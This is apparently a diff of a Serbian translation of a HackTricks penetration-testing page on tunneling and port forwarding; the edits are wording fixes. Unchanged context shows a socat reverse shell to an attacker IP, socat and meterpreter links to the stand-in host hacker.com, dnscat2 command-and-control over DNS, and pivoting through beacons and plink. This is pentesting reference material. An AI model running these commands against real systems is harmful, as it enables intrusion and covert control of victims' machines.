@@ -4,17 +4,17 @@
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF-u**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Podelite svoje hakovanje trikove slanjem PR-ova u [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -108,7 +108,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-Možete **tunelovati** sav **saobraćaj** ka **podmreži** preko domaćina.\
+Možete **tunelovati** sav **saobraćaj** ka **podmreži** preko hosta.\
 Na primer, prosleđivanje sav saobraćaj koji ide ka 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -130,7 +130,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-### SOCKS
+SOCKS (Socket Secure) je protokol koji omogućava rutiranje mrežnog saobraćaja između klijenta i servera putem proxy servera. SOCKS koristi port 1080 i može biti korišćen za tuneliranje različitih vrsta mrežnog saobraćaja, uključujući TCP i UDP.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -155,7 +155,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otvorite port u tim serveru koji sluša na svim interfejsima koji se mogu koristiti za **usmeravanje saobraćaja kroz beacon**.
+Otvorite port u tim serveru koji sluša na svim interfejsima i može se koristiti za **usmeravanje saobraćaja kroz beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -166,7 +166,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-U ovom slučaju, **port je otvoren na hostu zastavici**, a ne na Tim serveru i saobraćaj se šalje na Tim server, a odatle ka naznačenom hostu:port
+U ovom slučaju, **port je otvoren na hostu zastavici**, a ne na Tim Serveru i saobraćaj se šalje na Tim Server, a odatle ka naznačenom hostu:port
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -175,7 +175,7 @@ rportfwd stop [bind port]
 ### rPort2Port lokalno
 
 {% hint style="warning" %}
-U ovom slučaju, **port je otvoren na hostu bekon**, ne na Tim Serveru i **saobraćaj je poslat ka Cobalt Strike klijentu** (ne ka Tim Serveru) i odatle ka naznačenom hostu:port.
+U ovom slučaju, **port je otvoren na hostu Beacon-a**, a ne na Team Server-u i **saobraćaj je poslat ka Cobalt Strike klijentu** (ne ka Team Server-u) i odatle ka naznačenom hostu:port.
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -244,8 +244,6 @@ attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ### Port2Port
-
-### Port2Port
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
@@ -263,7 +261,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
+Možete zaobići **neovlašćeni proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -299,7 +297,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To je kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).
 
-Pošto će se ovaj binarni fajl izvršiti na žrtvi i to je ssh klijent, moramo otvoriti naš ssh servis i port kako bismo imali reverznu konekciju. Zatim, da prosledimo samo lokalno dostupan port na port našeg računara:
+Pošto će se ovaj binarni fajl izvršiti na žrtvi i to je ssh klijent, moramo otvoriti naš ssh servis i port kako bismo imali reverznu konekciju. Zatim, da bismo prosledili samo lokalno dostupan port na port našeg računara:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -308,7 +306,7 @@ echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0
 
 ### Port2Port
 
-Morate imati lokalne administratorske privilegije (za bilo koji port)
+Morate biti lokalni administrator (za bilo koji port)
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
 # Example:
@@ -331,9 +329,9 @@ Na vašem klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** na slede
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sada možemo **povezati** se sa **žrtvom** preko **RDP** koristeći **`mstsc.exe`**, i trebali bismo dobiti **prozor za unos** koji kaže da je **SocksOverRDP dodatak omogućen**, i da će **slušati** na **127.0.0.1:1080**.
+Sada možemo **povezati** se sa **žrtvom** preko **RDP** koristeći **`mstsc.exe`**, i trebali bismo dobiti **prozor** koji kaže da je **SocksOverRDP dodatak omogućen**, i da će **slušati** na **127.0.0.1:1080**.
 
-**Povežite** se preko **RDP** i otpremite & izvršite na mašini žrtve `SocksOverRDP-Server.exe` binarni fajl:
+**Povežite** se preko **RDP** i otpremite i izvršite na mašini žrtve binarni fajl `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -343,13 +341,13 @@ netstat -antb | findstr 1080
 ```
 Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da biste usmjerili saobraćaj kroz taj port.**
 
-## Proxify Windows GUI aplikacije
+## Proksifikuj Windows GUI aplikacije
 
-Možete omogućiti Windows GUI aplikacijama da prolaze kroz proxy korišćenjem [**Proxifier**](https://www.proxifier.com/).\
+Možete omogućiti Windows GUI aplikacijama da koriste proxy korišćenjem [**Proxifier**](https://www.proxifier.com/).\
 U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
-U **Profile -> Proxification Rules** dodajte ime programa za proxify i veze ka IP adresama koje želite da proxify-ujete.
+U **Profile -> Proxification Rules** dodajte ime programa za proksifikaciju i veze ka IP adresama koje želite da proksifikujete.
 
-## NTLM proxy zaobilaženje
+## NTLM zaobilaženje proxy-ja
 
 Prethodno pomenuti alat: **Rpivot**\
 **OpenVPN** takođe može da ga zaobiđe, podešavanjem ovih opcija u konfiguracionom fajlu:
@@ -360,7 +358,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autentiče se protiv proksi servera i vezuje lokalni port koji se prosleđuje ka spoljnoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Autentikuje se protiv proksi servera i vezuje lokalni port koji se prosleđuje ka spoljnoj usluzi koju odredite. Zatim, možete koristiti alat po vašem izboru preko ovog porta.\
 Na primer, prosleđuje port 443
 ```
 Username Alice
@@ -382,7 +380,7 @@ Obrnuti proxy kreiran od strane Microsoft-a. Možete ga pronaći ovde: [https://
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Potreban je root na oba sistema kako bi se kreirali tun adapteri i tunelovali podaci između njih korišćenjem DNS upita.
+Potreban je root na oba sistema da bi se kreirali tun adapteri i tunelovali podaci između njih korišćenjem DNS upita.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -396,7 +394,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 
 [**Preuzmite ga ovde**](https://github.com/iagox86/dnscat2)**.**
 
-Uspostavlja C\&C kanal putem DNS-a. Ne zahteva privilegije root korisnika.
+Uspostavlja C\&C kanal preko DNS-a. Ne zahteva root privilegije.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -412,7 +410,7 @@ Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
 ```
-#### **Prosleđivanje porta pomoću dnscat-a**
+#### **Prosleđivanje porta pomoću dnscat**
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
@@ -475,7 +473,7 @@ chmod a+x ./ngrok
 
 *Takođe je moguće dodati autentikaciju i TLS, ako je potrebno.*
 
-#### Tuneliranje TCP
+#### Tunelovanje TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -483,15 +481,15 @@ chmod a+x ./ngrok
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Otkrivanje fajlova putem HTTP-a
+#### Otkrivanje fajlova putem HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Sniffing HTTP pozivi
+#### Sniffing HTTP poziva
 
-*Korisno za XSS, SSRF, SSTI ...*
-Direktno sa stdout-a ili na HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).
+*Koristan za XSS, SSRF, SSTI ...*
+Direktno sa stdout-a ili preko HTTP interfejsa [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tuneliranje internih HTTP servisa
 ```bash
@@ -524,7 +522,7 @@ addr: file:///tmp/httpbin/
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -534,10 +532,10 @@ addr: file:///tmp/httpbin/
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF-u**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova u [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.
+* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repozitorijum](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repozitorijum](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
